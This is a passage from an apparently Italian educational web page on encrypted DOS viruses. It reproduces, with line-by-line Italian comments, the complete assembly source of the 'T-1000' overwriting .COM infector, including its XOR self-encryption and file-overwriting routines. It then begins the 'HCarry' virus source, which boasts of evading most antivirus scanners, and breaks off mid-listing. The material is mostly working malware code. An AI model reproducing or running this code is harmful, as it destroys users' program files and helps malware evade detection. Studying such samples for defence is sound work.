mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#B32D9D'>c) cerca un file ospite<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#B32D9D'>d) scrive nell’ospite il decryptor (parte non
crittata) e il codice virus crittato<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;<span style="mso-spacerun: yes">       </span>T-1000
Virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; This virus is a Non-Resident Overwriting
Self-Encrypting .COM File Inctector.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; When an infected program is started, the virus will
infect all files in the<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; current directory and use the time counter for its
encryption. It displays<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; the text &quot;T-1000&quot; when it is ready infecting.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'>Code<span style="mso-spacerun: yes">    </span>Segment
para 'code'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style="mso-spacerun: yes">        </span>Assume
Cs:Code,Ds:Code<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>Length<span style="mso-spacerun: yes">  </span>Equ
Offset EndByte-Offset Main<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>Org 100h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; decryptor: routine di decrittazione del codice virale.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; questa porzione del codice, fino alla label Decrypt, non<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; è crittata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>Main:<span style="mso-spacerun: yes">   </span>Mov Si,Offset
Decrypt<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>Mov Di,Si<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>Mov Cl,Offset EndByte-Offset Decrypt<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>On2:<span style="mso-spacerun: yes">    </span>Lodsb<span
style="mso-spacerun: yes">              </span>; [DI] -&gt; AL <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span>Db 34h<span
style="mso-spacerun: yes">             </span>; 34 imm 8 -&gt; XOR AL, imm8,
cioè XOR AL, chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>Crypt<span style="mso-spacerun: yes">   </span>Db 0<span
style="mso-spacerun: yes">               </span>; variabile per salvataggio
chiave (Crypt)<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span>Stosb<span
style="mso-spacerun: yes">              </span>; AL -&gt; [DI]++<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>Dec Cl<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>Cmp Cl,0ffh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>Jne On2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; fine parte non crittata -------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>Decrypt:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Mov
Ah,4eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>Push Ax<span style="mso-spacerun:
yes">            </span>; vedi istruzione POP AX più sotto<span
style="mso-spacerun: yes">          </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; ricava il valore della chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>Encr:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span>Mov Ah,2ch<span
style="mso-spacerun: yes">               </span>; legge l’ora del sistema<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span>Int 21h<span
style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span>Mov Crypt,Dl<span
style="mso-spacerun: yes">             </span>; in DL centesimi di secondo<span
style="mso-spacerun: yes">              </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span>Mov Si,Offset Decrypt<span
style="mso-spacerun: yes">    </span>; inizio parte da crittare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>Mov Di,Offset EndByte+10 ; in host-RAM<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>Mov Cx,Offset EndByte-Offset Decrypt ; numero di bytes da
crittare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; ciclo di crittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>On3:<span style="mso-spacerun: yes">    </span>Lodsb<span
style="mso-spacerun: yes">                  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span>Xor Al,Crypt<span
style="mso-spacerun: yes">              </span>; operazione di crittazione con
chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span>Stosb<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span>Dec Cx<span
style="mso-spacerun: yes">                    </span>; decrementa il contatore <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span>Cmp
Cx,0ffffh<span style="mso-spacerun: yes">             </span>; siamo alla fine
? <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>Jne On3<span style="mso-spacerun: yes">                  </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Pop Ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>On1:<span style="mso-spacerun: yes">    </span>Xor
Cx,Cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Mov
Dx,Offset Nam<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=DE style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:DE'>Int
21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><span style="mso-spacerun: yes">        </span>Jc<span
style="mso-spacerun: yes">  </span>Einde<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>Mov
Ax,3d01h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Mov
Dx,9eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Mov
Bx,Ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; scrive nell’host-disco la parte non crittata (decryptor)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span>Mov Ah,40h<span
style="mso-spacerun: yes">           </span>; funzione di scrittura<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>Push Ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>Mov Cx,Offset Decrypt-Offset Main<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>Mov Dx,Offset Main<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>Int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; scrive nell’host-disco la parte crittata (e memorizzata in
buffer)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>Pop Ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>Mov Cx,Offset EndByte-Offset Decrypt<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>Mov Dx,Offset EndByte+10<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>Int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Mov
Ah,3eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Mov
Ah,4fh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Push Ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Jmp
Short Encr<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'>Einde:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><span style="mso-spacerun: yes">        </span>Mov Ah,9<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>Mov
Dx,Offset Msg<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Push Cs<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>Pop Ds<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=DE style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:DE'>Int
21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><span style="mso-spacerun: yes">        </span>Int 20h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'>Msg<span style="mso-spacerun: yes">     </span>Db
'T-1000$'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>Nam<span style="mso-spacerun: yes">     </span>Db
'*.Com',0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'>EndByte Db 0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'>Code<span style="mso-spacerun: yes">    </span>Ends<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>End
Main<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:red;mso-ansi-language:EN-US'>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<o:p></o:p></span></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<h1><a name="_2._Virus_HCarry:"></a><span lang=EN-US style='mso-fareast-font-family:
"MS Mincho";color:red'>2. Virus HCarry:<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#B32D9D'>funzionamento: simile al precedente.<o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'>;<span
style="mso-spacerun: yes"> 
</span>ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'>;<span
style="mso-spacerun: yes">  </span>ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ&gt; and Remember Don't
Forget to Call &lt;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;<span style="mso-spacerun: yes"> 
</span>ÄÄÄÄÄÄÄÄÄÄÄÄ&gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;ÄÄÄÄÄÄÄÄÄÄ<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;<span style="mso-spacerun: yes"> 
</span>ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;This is the HCarry Virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;dedicated to the late Harry Carry<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;The only AV scanner that I know of that detects this
virus is TBAV Scanner<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; parte non crittata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>start:<span style="mso-spacerun: yes">             </span>;start
of virus!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>lea si, crypt_start<span style="mso-spacerun: yes">       
</span>; indirizzo di inizio codice da crittare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>mov di,si<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>mov cx,end - crypt_start<span style="mso-spacerun: yes">  
</span>; ricava n. bytes da crittare <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>call crypt<span style="mso-spacerun:
yes">                 </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>jmp crypt_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>xor_value db 0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; cript / decrypt un byte alla volta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>crypt:<o:p></o:p></span></b></p>

